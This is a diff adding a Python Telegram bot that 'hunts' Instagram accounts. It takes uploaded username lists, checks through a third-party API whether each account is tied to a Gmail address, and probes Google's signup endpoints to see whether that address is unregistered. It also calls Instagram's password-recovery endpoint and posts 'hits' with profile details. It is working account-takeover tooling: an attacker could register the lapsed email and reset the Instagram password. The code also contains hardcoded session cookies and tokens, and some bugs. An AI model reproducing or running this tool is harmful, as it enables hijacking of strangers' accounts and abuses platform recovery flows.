@@ -1,0 +1,156 @@
+import os,requests,telebot,random; from telebot import types;from uuid import uuid4
+def rest(user):
+	try:
+		rrr = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers={'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)'}).cookies.get_dict();csrftoken=rrr['csrftoken'];mid=rrr['mid'];signed_body=''.join(random.choice('azertyuiopqsdfghjklmwxcvbn1234567890') for i in range(120));ud = str(uuid4());headers = { 'X-IG-App-ID': '567067343352427','User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)','Accept-Language': 'en-GB, en-US','Cookie': f'mid={mid}; csrftoken={csrftoken}','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Host': 'i.instagram.com'};data = {'signed_body':signed_body+'.{"_csrftoken":"'+csrftoken+'","adid":"'+ud+'","guid":"'+ud+'","device_id":"'+ud+'","query":"'+user+'"}', 'ig_sig_key_version': '4'};response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data);return response.json()['email']
+	except:return 'erorr'
+import requests;import json;cookies = {
+    '_ga': 'GA1.1.868853150.1686571031',
+    'uid': '0ab9d21b837ac3f8',
+    'clickAds': '53',
+    'pushNotification': '92',
+    'pushPage': '19',
+    'XSRF-TOKEN': 'eyJpdiI6Ikoydk1rOUVmMExPOGF1WUMxWTNpTnc9PSIsInZhbHVlIjoiSE5VU0lSOTZnQnRhTGdDeE1cL3dIcDJmcmhWbm5IdU9wN3VNbytJck9DSjlVU2xqVkhPRUJuR21pS1JIUjRWSWRnYzZLXC8xXC9lNVJubWtOVlRHcjd1TFwvYU5sZFBCMkN6Y0pjZHNRWXJzMkYwcVE1aDMyR0xrb2x3SHlBU3ptbHZLIiwibWFjIjoiYzNjYjNhNWE4NGFlNzhmMTNlMTJiNGIxNDNmMDVjYThjZGUzZGU4ZjExMTEwN2QzNjgwNWE0OTNlNzE1ZDc1YyJ9',
+    'aig_session': 'eyJpdiI6IlFPaGc0UnY2bjNIWmxKeTBIbDVjXC9BPT0iLCJ2YWx1ZSI6IktVck9mTWF5UDdxY3RFXC9WeW5kR0ZTOTM5U3RjalBaSnlSd05mUlhkanN2NStldDhaSWtFXC9IeXFlbFFFNHNrS09VS3J4V2NDVWVpd0lncFljWEhJMGlERWpHSGZ4bWZGQTN5RVF0Mm9jT0NhR0xnRGFEaEs5eTRLSFlCd01OckkiLCJtYWMiOiIwNDEzNDBkNTc2NTRkMTkxODc2ZmUxZTIzOGQ0ODU1MWZmYWQyM2NmNGQ3MGQwZGU0OWUyMjEzMmRhOGU2ODAyIn0%3D',
+    '_ga_2S9JP0SPEL': 'GS1.1.1686741984.2.1.1686742384.0.0.0',
+};headers = {
+    'authority': 'storiesig.info',
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'if-none-match': 'W/"376-nN5i4Qu/s4Ex/bnNvBcI5Wa+U3U"',
+    'referer': 'https://storiesig.info/en/',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'x-token': 'null',
+    'x-xsrf-token': 'eyJpdiI6Ikoydk1rOUVmMExPOGF1WUMxWTNpTnc9PSIsInZhbHVlIjoiSE5VU0lSOTZnQnRhTGdDeE1cL3dIcDJmcmhWbm5IdU9wN3VNbytJck9DSjlVU2xqVkhPRUJuR21pS1JIUjRWSWRnYzZLXC8xXC9lNVJubWtOVlRHcjd1TFwvYU5sZFBCMkN6Y0pjZHNRWXJzMkYwcVE1aDMyR0xrb2x3SHlBU3ptbHZLIiwibWFjIjoiYzNjYjNhNWE4NGFlNzhmMTNlMTJiNGIxNDNmMDVjYThjZGUzZGU4ZjExMTEwN2QzNjgwNWE0OTNlNzE1ZDc1YyJ9',
+}
+import requests;from uuid import uuid4;import requests,json;from user_agent import generate_user_agent as ee;import random;from uuid import uuid4;import os;import secrets;filetl='tl.txt'
+def user_ag():a='Mozilla/5.0 (Symbian/3; Series60/';b=random.randrange(1, 9);c=random.randrange(1, 9);d='Nokia';e=random.randrange(100, 9999);f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/';g=random.randrange(1, 9);h=random.randrange(1, 4);i=random.randrange(1, 4);j=random.randrange(1, 4);k='Mobile Safari/535.1';uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}');return uaku
+def tll():
+	cok = secrets.token_hex(8) * 2
+	re = requests.post('https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=82313&rt=j',headers= {'Accept':'*/*','Accept-Encoding':'gzip, deflate, br','Accept-Language':'ar,en-US;q=0.9,en;q=0.8,pt;q=0.7','Content-Length':'2012','Content-Type':'application/x-www-form-urlencoded;charset=UTF-8','Cookie':cok,'Google-Accounts-Xsrf':'1','Origin':'https://accounts.google.com','Referer':'https://accounts.google.com/signup/v2/createaccount?theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp','Sec-Ch-Ua':'"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"','Sec-Ch-Ua-Arch':'"x86"','Sec-Ch-Ua-Bitness':'"64"','Sec-Ch-Ua-Full-Version':'"116.0.5845.188"','Sec-Ch-Ua-Full-Version-List':'"Chromium";v="116.0.5845.188", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.188"','User-Agent':user_ag(),'X-Chrome-Id-Consistency-Request':'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=b20ba583-8cad-46a7-80ea-88e6755866ad,sync_account_id=105342098533404169783,signin_mode=all_accounts,signout_mode=show_confirmation','X-Client-Data':'CIe2yQEIpbbJAQipncoBCMzfygEIlKHLAQiFoM0BCI2yzQEI3L3NAQjfxM0BCOnFzQEIucrNAQjV0M0BCJHSzQEIitPNAQj5wNQVGPXJzQE=','X-Same-Domain':'1'},data={'theme': 'glif','continue': 'https://accounts.google.com/ManageAccount?nc=1','f.req': '["AEThLlzavccs_MdaDMBDfSU7NEeTKr02URa8Y9GAk-2d5ygvEJv1okzAOPzpFw_rFw7MwSmg0m4SxVvZNNMz97nf2-NlwAlseWtZSAdlgAwoVzJaYtv-tuezCMXj8lHpLGDJbv2PEVTDn47o79z30klv1McaYIuuIW8xRVelt4tQ3jbscrpSkCTv7cT5a5A3FvaQISHBljEF",null,null,null,null,0,0,"strrgrs","strrgrs","web-glif-signup",0,null,10,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"b20ba583-8cad-46a7-80ea-88e6755866ad",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],1]','at': 'AFoagUUzkiOnQaoRtzNNCpQ0ha9o8tIkSQ:1695585059018','azt': 'AFoagUUi89PpEd8CL8NrG88__muZtPuD_w:1695585059018','cookiesDisabled': 'false','deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"b20ba583-8cad-46a7-80ea-88e6755866ad",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]','gmscoreversion': 'undefined','flowName': 'GlifWebSignIn','checkConnection': 'youtube:290:0','checkedDomains': 'youtube','pstMsg': '1',}).text;TLL = re.split('["gf.ttu",null,"')[1].split('"],')[0];re2 = requests.post('https://accounts.google.com/_/signup/validatebasicinfo?hl=ar&TL=AJeL0C43qObZzGhdyZTfL_-PeEXerBAQ8r6OB8Tq1uhlCyJ0Y-WKaVwPFuDvjohv&_reqid=283689&rt=j',headers= {'Accept':'*/*','Accept-Encoding':'gzip, deflate, br','Accept-Language':'ar,en-US;q=0.9,en;q=0.8,pt;q=0.7','Content-Length':'1243','Content-Type':'application/x-www-form-urlencoded;charset=UTF-8','Cookie':cok,'Google-Accounts-Xsrf':'1','Origin':'https://accounts.google.com','Referer':'https://accounts.google.com/signup/v2/birthdaygender?theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL=AJeL0C43qObZzGhdyZTfL_-PeEXerBAQ8r6OB8Tq1uhlCyJ0Y-WKaVwPFuDvjohv','Sec-Ch-Ua':'"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"','Sec-Ch-Ua-Arch':'"x86"','Sec-Ch-Ua-Bitness':'"64"','Sec-Ch-Ua-Full-Version':'"116.0.5845.188"','Sec-Ch-Ua-Full-Version-List':'"Chromium";v="116.0.5845.188", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.188"','User-Agent':user_ag(),'X-Chrome-Id-Consistency-Request':'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=b20ba583-8cad-46a7-80ea-88e6755866ad,sync_account_id=105342098533404169783,signin_mode=all_accounts,signout_mode=show_confirmation','X-Client-Data':'CIe2yQEIpbbJAQipncoBCMzfygEIlKHLAQiFoM0BCI2yzQEI3L3NAQjfxM0BCOnFzQEIucrNAQjV0M0BCJHSzQEIitPNAQj5wNQVGPXJzQE=','X-Same-Domain':'1'},data={'theme': 'glif','continue': 'https://accounts.google.com/ManageAccount?nc=1','f.req': f'["TL:{TLL}",1999,3,6,2,null,null,0,null,null,0,0]','at': 'AFoagUXYUhTvUEnQe3grDoZb22BYTBUXFg:1695586462543','azt': 'AFoagUWQYD1CqlgiVRQg71n710QgPsx-jA:1695586462544','cookiesDisabled': 'false','deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"b20ba583-8cad-46a7-80ea-88e6755866ad",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]','gmscoreversion': 'undefined','flowName': 'GlifWebSignIn','checkConnection': 'youtube:486:0','checkedDomains': 'youtube','pstMsg': '1'}).text
+	try:
+		tl=re2.split('["gf.bgvr",1,0,0,"TL:')[1].split('",null,null,0,24,null,null,0],["e",2,null,null,146]]]')[0]
+		try:os.remove(filetl)
+		except:pass
+		with open(filetl, 'a') as (fffffffffff):
+		  	fffffffffff.write(tl+'\n')
+		  	fffffffffff.close()
+	except:tll()
+tll()
+def gmail(email):
+    try:mc =  open(filetl,'r').read().splitlines();tl =  random.choice(mc)
+    except:tll();gamil(email)
+    uui,uid= uuid4(),uuid4()
+    if '@' in email:
+    	email=email.split('@')[0]+'@gmail.com'
+    else:
+    	email=email+'@gmail.com'
+    response = requests.post('https://accounts.google.com/_/signup/usernameavailability',params={'hl': 'en','TL': tl,'_reqid': '72345','rt': 'j',},headers={'Host': 'accounts.google.com','sec-ch-ua': 'Google','x-same-domain': '1','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded;charset=UTF-8','sec-ch-ua-full-version': '119.0.6045.163','sec-ch-ua-platform-version': '10.0.0','google-accounts-xsrf': '1','sec-ch-ua-full-version-list': 'Google','sec-ch-ua-model': 'SM-M205F','sec-ch-ua-wow64': '?0','sec-ch-ua-platform': 'Android','accept': '*/*','origin': 'https://accounts.google.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://accounts.google.com/signup/v2/createusername?TL='+tl+'&continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dgmail%26oq%3Dgmail%26gs_lcrp%3DEgZjaHJvbWUqBggAEEUYOzIGCAAQRRg7MgYIARBFGDwyBggCEEUYPDIGCAMQRRg8MgYIBBBFGDwyBggFEEUYPDIHCAYQABiPAjIHCAcQABiPAtIBCDEzNDRqMGo3qAIAsAIA%26client%3Dms-android-samsung-gj-rev1%26sourceid%3Dchrome-mobile%26ie%3DUTF-8%26ptid%3D19034382%26ptt%3D8%26fpts%3D1702839894853&dsh=S-1056100206%3A1702839899691979&ec=futura_srp_og_si_4980089_p&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&ifkv=ASKXGp2LNTeADceDHwvZ88X9gc_54ZaDzkh79Amfpidz7fs8bf7W9Bg4DPxctjTqcwNOC4UPSKdYig&theme=glif','accept-encoding': 'gzip, deflate, br','accept-language': 'en-GB,en;q=0.9'},data={'theme': 'glif','continue': 'https://accounts.google.com/ManageAccount?nc=1','f.req': f'["TL:{tl}","{email}",0,0,0,null,0,15856]','at': 'AFoagUV7ayPwNwcTzAJd8hG5bsUQ9UspxA:1695553167761','azt': 'AFoagUXaPxbm3Wne7jhJpuTr_KRQXXYYHQ:1695553167761','cookiesDisabled': 'false','deviceinfo': f'[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"{uui}",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]','gmscoreversion': 'undefined','flowName': 'GlifWebSignIn','checkConnection': '','checkedDomains': 'youtube','pstMsg': '1'}).text
+    if '"gf.uar",1' in response:tll();return 'ok'
+    elif '[[["er",null,null,null,null,400,null,null,null,3],["e",2,null,null,78]]]' in response:tll();gamil(email)
+    else:return 'sssssst'
+def insta(email):
+	try:
+		req=requests.get(f'http://instaapi.freefirelvl701.repl.co/Qredes/email={email}').json()['message']
+		if req=='good':pp='ok';return pp
+		else:pp='stef';return pp
+	except:insta(email)
+def info(user,hit):
+	try:
+		
+		url = requests.get(f'https://storiesig.info/api/ig/profile/{user}', cookies=cookies, headers=headers)
+		data = json.loads(url.content)
+		id = data['result']['id']
+		user = data['result']['username']
+		bio = data['result']['biography']
+		name = data['result']['full_name']
+		mn = data['result']['edge_owner_to_timeline_media']['count']
+		followed = data['result']['edge_followed_by']['count']
+		follow = data['result']['edge_follow']['count']
+		img = data['result']['profile_pic_url']
+		date=requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()['date']
+		rest1=rest(user)
+            				
+
+		tlg = f'''
+⌯ Hi Qredes Got Hit
+ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
+⌯ Hits —>  {hit}
+⌯ User —>  {user}
+⌯ Email —> {user}@gmail.com
+⌯ Date —> {date}
+⌯ Follower -> {followed} × {follow} <- Following ⌯
+⌯ Id —> {id}
+⌯ Bio —> {bio}
+⌯ Name —> {name}
+⌯ Reset —> {rest1}
+   BY : @Qredes
+    ''';return tlg
+		
+	except:
+		
+		tlg = f'''
+⌯ Hi Qredes Got Hit
+ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
+⌯ Hits —>  {hit}
+⌯ User —>  {user}
+⌯ Email —> {user}@gmail.com
+⌯ Date —> H
+⌯ Follower -> H × H <- Following ⌯
+⌯ Id —> H
+⌯ Bio —> H
+⌯ Name —> H
+   BY : @Qredes
+    '''
+	return tlg
+bot = telebot.TeleBot(("Qredes_malik_lbot_adwaml"))
+@bot.message_handler(commands=['start'])
+def srt(message):
+	check = types.InlineKeyboardButton(text='ابدأ - Start ',callback_data='check')
+	hg = types.InlineKeyboardMarkup(row_width=1);hg.add(check)
+	bot.send_message(message.chat.id,text='اهلا بك عزيزي في بوت صيد متاحات انستكرام اختر من الازرار التاليه',reply_markup=hg)
+@bot.callback_query_handler(func=lambda call:True)
+def Call(call):
+	if call.data=='check':
+		sTo = bot.send_message(call.message.chat.id,text=f'- اهلاً بَك عزيزي ارسل الملف الان .')
+		bot.register_next_step_handler(sTo,check)
+def check(message):
+	hit = 0
+	unlink = 0
+	num = 0
+	unava = 0
+	try:
+		filename = message.document.file_name
+		fil = bot.get_file(message.document.file_id)
+		dow = bot.download_file(fil.file_path)
+		with open(filename, 'wb') as f0:
+			f0.write(dow)
+			p_file = open(filename, "r")
+			mssg=bot.send_message(message.chat.id,text="wait a letile ...")
+	except:
+		bot.send_message(message.chat.id,text='''*ارسل ملف صحيح *''',parse_mode="Markdown")
+		return
+	with open(filename, "r") as f4:
+		all_line = f4.readlines()
+		allline = len(all_line)
+	file = open(filename,'r').read().splitlines()
+	for user in file:
+		try:
+			if '@' in user:user=user.split('@')[0];email = user + '@gmail.com'
+			else:email = user + '@gmail.com'
+			if '_' in user:unlink+=1;num+=1;Ronaldo = types.InlineKeyboardMarkup(row_width=1);zr0=types.InlineKeyboardButton(text='- {}'.format(email),callback_data='zr0');zr1=types.InlineKeyboardButton(text='- UnLinked InstaGram : {}'.format(unlink),callback_data='zr1');zr2=types.InlineKeyboardButton(text='- UnAvailable Gmail : {}'.format(unava),callback_data='zr2');zr3=types.InlineKeyboardButton(text='- Avaliable : {}'.format(hit),callback_data='zr3');zr4=types.InlineKeyboardButton(text='- List : {} \ {}'.format(num,allline),callback_data='zr4');zr5=types.InlineKeyboardButton(text='- Prog : Click Here',url='https://t.me/Qredes');Ronaldo.add(zr0,zr3,zr2,zr1,zr4,zr5);bot.edit_message_text(chat_id=message.chat.id,message_id=mssg.message_id,text="- Draw has been started  .",parse_mode='markdown',reply_markup=Ronaldo)
+			else:
+						if insta(email) == 'ok':
+							if gmail(user) == 'ok':nn = user;hit+=1;num+=1;Ronaldo = types.InlineKeyboardMarkup(row_width=1);zr0=types.InlineKeyboardButton(text='- {}'.format(email),callback_data='zr0');zr1=types.InlineKeyboardButton(text='- UnLinked InstaGram : {}'.format(unlink),callback_data='zr1');zr2=types.InlineKeyboardButton(text='- UnAvailable Gmail : {}'.format(unava),callback_data='zr2');zr3=types.InlineKeyboardButton(text='- Avaliable : {}'.format(hit),callback_data='zr3');zr4=types.InlineKeyboardButton(text='- List : {} \ {}'.format(num,allline),callback_data='zr4');zr5=types.InlineKeyboardButton(text='- Prog : Click Here',url='https://t.me/Qredes');Ronaldo.add(zr0,zr3,zr2,zr1,zr4,zr5);bot.edit_message_text(chat_id=message.chat.id,message_id=mssg.message_id,text="- The hunt has begun .",parse_mode='markdown',reply_markup=Ronaldo);bot.send_message(message.chat.id,info(user,hit))
+							else:unava+=1;num+=1;Ronaldo = types.InlineKeyboardMarkup(row_width=1);zr0=types.InlineKeyboardButton(text='- {}'.format(email),callback_data='zr0');zr1=types.InlineKeyboardButton(text='- UnLinked InstaGram : {}'.format(unlink),callback_data='zr1');zr2=types.InlineKeyboardButton(text='- UnAvailable Gmail : {}'.format(unava),callback_data='zr2');zr3=types.InlineKeyboardButton(text='- Avaliable : {}'.format(hit),callback_data='zr3');zr4=types.InlineKeyboardButton(text='- List : {} \ {}'.format(num,allline),callback_data='zr4');zr5=types.InlineKeyboardButton(text='- Prog : Click Here',url='https://t.me/Qredes');Ronaldo.add(zr0,zr3,zr2,zr1,zr4,zr5);bot.edit_message_text(chat_id=message.chat.id,message_id=mssg.message_id,text="- The hunt has begun .",parse_mode='markdown',reply_markup=Ronaldo)
+						else:unlink+=1;num+=1;Ronaldo = types.InlineKeyboardMarkup(row_width=1);zr0=types.InlineKeyboardButton(text='- {}'.format(email),callback_data='zr0');zr1=types.InlineKeyboardButton(text='- UnLinked InstaGram : {}'.format(unlink),callback_data='zr1');zr2=types.InlineKeyboardButton(text='- UnAvailable Gmail : {}'.format(unava),callback_data='zr2');zr3=types.InlineKeyboardButton(text='- Avaliable : {}'.format(hit),callback_data='zr3');zr4=types.InlineKeyboardButton(text='- List : {} \ {}'.format(num,allline),callback_data='zr4');zr5=types.InlineKeyboardButton(text='- Prog : Click Here',url='https://t.me/Qredes');Ronaldo.add(zr0,zr3,zr2,zr1,zr4,zr5);bot.edit_message_text(chat_id=message.chat.id,message_id=mssg.message_id,text="- Draw has been started  .",parse_mode='markdown',reply_markup=Ronaldo)
+		except:unlink+=1;num+=1;continue
+
+	bot.send_message(message.chat.id,'انتها الفحص');os.remove(filename)
+if __name__=="__main__":
+	bot.infinity_polling()
